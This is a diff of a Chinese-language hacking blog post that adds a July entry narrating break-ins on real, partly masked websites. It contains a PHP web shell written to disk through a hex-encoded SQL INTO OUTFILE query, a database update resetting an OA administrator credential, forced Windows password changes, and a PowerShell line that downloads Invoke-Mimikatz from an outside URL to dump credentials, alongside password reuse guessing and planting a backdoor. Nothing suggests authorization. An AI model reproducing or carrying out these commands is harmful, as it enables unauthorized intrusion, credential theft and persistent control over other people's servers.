@@ -102,7 +102,13 @@
 <meta property="og:image" content="http://i.imgur.com/7NwQXB2.jpg">
 <meta property="og:image" content="http://i.imgur.com/8F7AfIj.jpg">
 <meta property="og:image" content="http://i.imgur.com/wthgq9S.jpg">
-<meta property="og:updated_time" content="2017-05-29T17:35:29.537Z">
+<meta property="og:image" content="http://i.imgur.com/MxPoK2z.jpg">
+<meta property="og:image" content="http://i.imgur.com/SFjlyZe.jpg">
+<meta property="og:image" content="http://i.imgur.com/RwAHNx7.jpg">
+<meta property="og:image" content="http://i.imgur.com/Sbn5jMb.jpg">
+<meta property="og:image" content="http://i.imgur.com/Vts1qUL.jpg">
+<meta property="og:image" content="http://i.imgur.com/oqF6xOm.jpg">
+<meta property="og:updated_time" content="2017-07-01T09:14:03.059Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="一星期实战总结（七）">
 <meta name="twitter:description">
@@ -379,7 +385,37 @@
 <p>这个网站引起我的注意，如果网站管理员这么弱智,那么整体安全也就那样．<br>大概看了一下之后，测试了一下旁站：<br><a href="http://kixxxar.uyxxxqa.com/kxxxlar.uxxxxqa.com.zip" target="_blank" rel="external">http://kixxxar.uyxxxqa.com/kxxxlar.uxxxxqa.com.zip</a>　　<br>下载回来分析，没什么进展，如果都是一个人建的网站，那么肯定也有999端口吧．<br>测试了一下确实有phpmyadmin，通过<br>root<br>zkeys<br>获取一些后台密码：<br>Admin<br>arxxxxxxx<br>进入，<br><img src="http://i.imgur.com/8F7AfIj.jpg" alt=""><br>然后再次猜想，如果和目标站同一个人，那么很可能密码也类似：<br>通过后台密码登录上目标服务器，完成．<br>然后种马，以免掉线<br><img src="http://i.imgur.com/wthgq9S.jpg" alt=""></p>
 <p>总结：<br>有时候手感来了，多想想、多花点心思和耐心还是有很多站可以搞下来的。</p>
 <h4 id="第三、四周"><a href="#第三、四周" class="headerlink" title="(第三、四周)"></a>(第三、四周)</h4><p>这两个星期搞站没有什么进展，当所有的信息收集之后没有发现可利用点时，这时候就大部分时间在浪费时间在重复着做着同样的事情，我觉得很没有必要，这两个星期下来很有必要把自己的扫描目录字典、各类服务密码的字典还需再针对目标性的加强一下。<br>对每个目标要深度分析、以及每一步的操作都需要关联以及联想。</p>
-
+<h3 id="七月"><a href="#七月" class="headerlink" title="七月"></a>七月</h3><p>之前搞了很多东西不适合写出来，有些搞完之后并没有整理，主要还是懒。</p>
+<p>某目标站打开提示：<br><img src="http://i.imgur.com/MxPoK2z.jpg" alt=""></p>
+<p>判断IP为：<br><img src="http://i.imgur.com/SFjlyZe.jpg" alt=""></p>
+<p>进行端口扫描发现官方网站在9095端口<br><code>http://domain:9095</code><br><img src="http://i.imgur.com/RwAHNx7.jpg" alt=""></p>
+<p>利用Thinkphp框架，不过后来发现网站上的URL并没有做任何的过滤，<br><img src="http://i.imgur.com/Sbn5jMb.jpg" alt=""></p>
+<p>直接sqlmap，不过通过SQLMAP并不可以直接写Shell，所以获取了后台的密码。<br>发现后台登录的验证码无法加载。</p>
+<p>通过端口扫描也发现了3306端口，直接获取数据库密码，并支持外链直接进数据库。<br>之前也爆之前爆有路径，直拉select into outfile写Shell。<br>发现写进行的都会被删除，发现一些正常文件则没有被删除应该是有杀软或者其它。</p>
+<p>之后发现其它端口开放着OA系统，如果能进入OA就不需要获取服务器权限了。<br><img src="http://i.imgur.com/Vts1qUL.jpg" alt=""></p>
+<p>密码无解。<br>这里打算修改管理员密码:</p>
+<pre><code class="mysql">UPDATE ORG_PRINCIPAL SET CREDENTIAL_VALUE=’L0tEW5Yk+cM2RjWYC8z1dYgp0c0=’ WHERE ID=26 AND LOGIN_NAME=’system’;
+</code></pre>
+<p><code>L0tEW5Yk+cM2RjWYC8z1dYgp0c0=</code>密码为system，当修改完还是无法生效需要重启软件服务清除缓存才可以实现，所以这里直接修改数据库无效。</p>
+<p>继续写Shell<br><code>&lt;?php echo \&#39;&lt;pre&gt;\&#39;;system($_GET[\&#39;cmd\&#39;]); echo \&#39;&lt;/pre&gt;\&#39;; ?&gt;</code><br>转换成十六进制数据库写Shell</p>
+<p><code>Select 0x3c3f706870206563686f205c273c7072653e5c273b73797374656d28245f4745545b5c27636d645c275d293b206563686f205c273c2f7072653e5c273b203f3e into outfile ‘D:\domain\ThinkPHP\Library\Think\mm.php’</code></p>
+<p>执行命令直接是system最高权限。<br><code>Tasklist /svc</code>发现存在360杀毒+360卫士+服务器安全狗</p>
+<p>net user发现服务器存在3个用户：<br><code>administrator
+adminxx
+rickxx</code></p>
+<p>想通过网页形式执行powershell读取管理密码，显示超时。</p>
+<p>通过for添加用户，不过无法成功，(老安全狗添加用户方法,最后<br><code>Net user rickxx 123qwe！@#</code>直接修改用户密码。<br>登录上去获取通过powershell获取管理员密码：</p>
+<p><code>powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://dwz.cn/1OropX&#39;); Invoke-Mimikatz -DumpCreds&quot;</code></p>
+<p><code>administrator
+xxxxxxxxxxx@2016</code></p>
+<p>刚获取密码rickxx 用户被删除并被 踢了出来</p>
+<p>此时等到晚上管理员下班，通过密码登录，不过发现密码错误，后来看了一下密码的规律，密码后面是2016那就写成 2017吧。<br>xxxxxxxxxxxxx@2017<br>登录成功<br>然后幸运的是，mssql数据库里面管理员的密码是明文：<br>Admin<br>xxx123</p>
+<p>发现桌面有管理系统软件：<br><img src="http://i.imgur.com/oqF6xOm.jpg" alt=""></p>
+<p>猜测密码为同样。<br>完成！</p>
+<p>总结：</p>
+<pre><code>1.    平时收集过WAF的东西太少，并没有把资料定期整理。
+2.    运气也是一部分！
+</code></pre>
       
     </div>
 
@@ -531,7 +567,7 @@
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#五月"><span class="nav-number">1.</span> <span class="nav-text">五月</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#（第一周）"><span class="nav-number">1.1.</span> <span class="nav-text">（第一周）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（第二周）"><span class="nav-number">1.2.</span> <span class="nav-text">（第二周）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第三、四周"><span class="nav-number">1.3.</span> <span class="nav-text">(第三、四周)</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#五月"><span class="nav-number">1.</span> <span class="nav-text">五月</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#（第一周）"><span class="nav-number">1.1.</span> <span class="nav-text">（第一周）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（第二周）"><span class="nav-number">1.2.</span> <span class="nav-text">（第二周）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第三、四周"><span class="nav-number">1.3.</span> <span class="nav-text">(第三、四周)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#七月"><span class="nav-number">2.</span> <span class="nav-text">七月</span></a></li></ol></div>
             
           </div>
         </section>
